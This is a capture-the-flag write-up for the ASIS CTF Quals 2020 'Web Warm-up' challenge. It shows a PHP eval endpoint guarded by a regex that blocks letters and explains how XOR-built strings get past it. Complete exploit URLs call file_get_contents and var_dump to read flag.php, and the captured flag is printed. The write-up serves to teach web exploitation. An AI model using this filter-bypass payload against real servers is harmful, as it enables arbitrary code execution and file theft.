# ASIS CTF Quals 2020 – Web Warm-up

* **Category:** web
* **Points:** 33

## Challenge

> Warm up! Can you break all the tasks? I'll pray for you!
> 
> read flag.php
> 
> Link: http://69.90.132.196:5003/?view-source

## Solution

You have to read the `flag.php` file. Connecting to the URL you can see the following source code.

```php
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}
```

There is an `eval` execution over the `warmup` GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.

Luckily, some techniques to bypass this kind of checks exist and [I've used them before](https://github.com/m3ssap0/CTF-Writeups/blob/b83e31b155a13d642e527968a9375c295c6a6977/Inferno%20CTF%202019/Dank%20PHP/README.md).

The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
* [Bypass WAF - Php webshell without numbers and letters](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/);
* [`preg_match` Code Execution](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution).

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

```php
$_="`{{{"^"?<>/"; // This is: "_GET" string.
```

Then you can specify the execution of the content of a GET parameter with the following code.

```php
${$_}[_]();       // This is $_GET[_]()
```

So the payload that will be executed by the `eval` instruction will be the following.

```php
$_="`{{{"^"?<>/";${$_}[_]();
```

Using a payload like the following, will let you to execute the `phpinfo` page.

```
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&_=phpinfo
```

The complete payload is the following.

```
http://69.90.132.196:5003/?warmup=$_=%22`{{{%22^%22?%3C%3E/%22;$_0=${$_}[_](${$_}[__]);${$_}[___]($_0);&_=file_get_contents&__=flag.php&___=var_dump
```

It can be composed step by step.

```php
$_="`{{{"^"?<>/";          // This is _GET string representation composed before.
$_0=${$_}[_](${$_}[__]);   // This is $_0 = $_GET[_]($_GET[__]) and it is used to perform: file_get_contents("flag.php")
${$_}[___]($_0);           // This is $_GET[___]($_0) and it is used to perform: var_dump($_0)
```

The result of the attack will be the following.

```
string(46) "<?php
$flag = "ASIS{w4rm_up_y0ur_br4in}";
?>"
```